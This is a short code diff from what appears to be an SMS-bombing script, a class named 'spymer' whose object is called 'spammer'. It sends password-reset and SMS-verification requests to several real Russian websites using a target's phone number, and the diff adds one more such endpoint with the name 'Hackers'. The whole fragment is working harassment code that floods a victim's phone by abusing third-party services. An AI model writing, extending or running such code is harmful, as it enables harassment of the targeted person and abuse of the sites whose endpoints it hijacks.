@@ -57,6 +57,7 @@ class spymer:
 			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
 			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
 			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
+			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Hackers','phone': _phone})
 			
 spammer = spymer()
 spammer.main()
